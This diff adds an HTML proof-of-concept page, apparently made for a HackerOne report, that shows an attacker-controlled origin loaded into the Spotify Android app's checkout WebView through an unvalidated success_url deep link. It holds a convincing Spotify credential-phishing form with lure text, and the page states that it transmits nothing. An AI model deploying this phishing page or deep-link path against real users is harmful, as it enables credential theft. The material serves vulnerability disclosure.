@@ -1,0 +1,111 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Attacker-controlled origin — Spotify Android PoC</title>
+<style>
+  *{box-sizing:border-box}
+  body{margin:0;background:#121212;color:#fff;
+       font-family:-apple-system,Roboto,Helvetica,Arial,sans-serif}
+  .flag{background:#b3261e;color:#fff;padding:13px 16px;position:sticky;top:0;z-index:9;
+        border-bottom:3px solid #ff6b6b}
+  .flag b{display:block;font-size:15px;letter-spacing:.2px}
+  .flag span{display:block;font-size:12px;opacity:.95;margin-top:5px;line-height:1.5}
+  .origin{font-family:ui-monospace,Menlo,monospace;font-size:12px;background:#000;
+          color:#ffd4d4;padding:7px 9px;border-radius:4px;margin-top:9px;word-break:break-all}
+  .wrap{max-width:430px;margin:0 auto;padding:24px 24px 44px}
+  .logo{display:flex;align-items:center;justify-content:center;gap:9px;padding:14px 0 22px}
+  .logo svg{width:33px;height:33px}
+  .logo span{font-size:21px;font-weight:700;letter-spacing:-.4px}
+  h1{font-size:25px;line-height:1.22;text-align:center;margin:0 0 11px;font-weight:800}
+  p.sub{color:#b3b3b3;font-size:14px;text-align:center;margin:0 0 26px;line-height:1.5}
+  label{display:block;font-size:13px;font-weight:700;margin:0 0 7px}
+  input{width:100%;padding:14px;border-radius:4px;border:1px solid #727272;
+        background:#121212;color:#fff;font-size:15px;margin-bottom:17px}
+  input:focus{outline:none;border-color:#fff}
+  button{width:100%;padding:15px;border:0;border-radius:500px;background:#1ed760;
+         color:#000;font-size:16px;font-weight:800}
+  hr{border:0;border-top:1px solid #292929;margin:26px 0 16px}
+  .note{color:#a7a7a7;font-size:11.5px;text-align:center;line-height:1.55}
+  #cap{display:none;margin-top:24px;border:2px solid #ff6b6b;border-radius:8px;padding:16px;background:#1a0d0d}
+  #cap h2{margin:0 0 10px;font-size:15px;color:#ff8a8a}
+  #cap .row{font-family:ui-monospace,Menlo,monospace;font-size:13px;
+            background:#000;padding:9px;border-radius:4px;margin-bottom:8px;word-break:break-all}
+  #cap p{font-size:12px;color:#d7b3b3;line-height:1.55;margin:10px 0 0}
+  .tech{margin-top:30px;border-top:1px solid #292929;padding-top:18px;
+        font-size:11.5px;color:#8d8d8d;line-height:1.6}
+  .tech code{font-family:ui-monospace,Menlo,monospace;color:#b9b9b9;word-break:break-all}
+  .tech b{color:#cfcfcf}
+</style>
+</head>
+<body>
+
+<div class="flag">
+  <b>&#9888; ATTACKER-CONTROLLED PAGE &mdash; THIS IS NOT SPOTIFY</b>
+  <span>Security proof-of-concept for a HackerOne report on the Spotify Android app.
+        If you are seeing this wrapped in Spotify&rsquo;s payment UI, an unrelated origin
+        has been loaded into Spotify&rsquo;s in-app checkout WebView.</span>
+  <div class="origin">served from: <span id="org">(origin)</span></div>
+</div>
+
+<div class="wrap">
+  <div class="logo">
+    <svg viewBox="0 0 24 24" fill="#1ed760"><path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.5 17.3c-.22.36-.68.47-1.04.25-2.85-1.74-6.44-2.14-10.66-1.17a.75.75 0 1 1-.33-1.47c4.62-1.06 8.58-.6 11.78 1.35.36.22.47.68.25 1.04zm1.47-3.27c-.27.45-.85.59-1.3.31-3.26-2-8.23-2.59-12.09-1.42a.94.94 0 1 1-.55-1.8c4.4-1.33 9.88-.68 13.63 1.62.44.27.58.85.31 1.29zm.13-3.4C15.2 8.3 8.9 8.09 5.17 9.22a1.12 1.12 0 1 1-.65-2.15C8.8 5.77 15.76 6.02 20.2 8.66a1.12 1.12 0 0 1-1.1 1.97z"/></svg>
+    <span>Spotify</span>
+  </div>
+
+  <h1>Confirm your details</h1>
+  <p class="sub">We could not verify the payment method on your Premium plan.
+     Log in to confirm your account and keep your subscription active.</p>
+
+  <form id="f" autocomplete="off">
+    <label>Email or username</label>
+    <input name="email" type="text" autocapitalize="off" autocorrect="off" placeholder="name@example.com">
+    <label>Password</label>
+    <input name="password" type="password" placeholder="Password">
+    <button type="submit">Log in and continue</button>
+  </form>
+
+  <div id="cap">
+    <h2>&#9888; These values are now under the attacker&rsquo;s control</h2>
+    <div class="row" id="c1"></div>
+    <div class="row" id="c2"></div>
+    <p>In a real attack this page would transmit them to the attacker&rsquo;s server and
+       then show a Spotify success screen, so the victim never suspects anything.
+       <b>This PoC transmits nothing</b> &mdash; the values never leave your device and
+       are only echoed here to demonstrate the capture.</p>
+  </div>
+
+  <hr>
+  <p class="note">The chrome around this page &mdash; the close button and the
+     &ldquo;Spotify&rdquo; title bar &mdash; is drawn by the Spotify app itself.
+     There is no address bar, so a victim has nothing to inspect.</p>
+
+  <div class="tech">
+    <b>What this demonstrates</b><br>
+    <code>SpotifyCheckoutCallbackActivity</code> (exported, <code>BROWSABLE</code>)
+    accepts <code>spotify-checkout://payment-callback/&lt;uuid&gt;?status=success&amp;success_url=&lt;URL&gt;</code>,
+    URL-decodes <code>success_url</code> and loads it in the checkout WebView with no
+    origin, scheme or allow-list validation. Any web page or installed app can supply that URL.
+    <br><br>
+    <b>Rendering context</b><br>
+    <code id="ua"></code>
+  </div>
+</div>
+
+<script>
+  document.getElementById('org').textContent = location.origin + location.pathname;
+  document.getElementById('ua').textContent = navigator.userAgent;
+  document.getElementById('f').addEventListener('submit', function (e) {
+    e.preventDefault();                       // nothing is ever transmitted
+    var d = new FormData(e.target);
+    document.getElementById('c1').textContent = 'email    : ' + (d.get('email') || '(empty)');
+    document.getElementById('c2').textContent = 'password : ' + (d.get('password') || '(empty)');
+    document.getElementById('cap').style.display = 'block';
+    document.getElementById('cap').scrollIntoView({behavior: 'smooth'});
+  });
+</script>
+</body>
+</html>
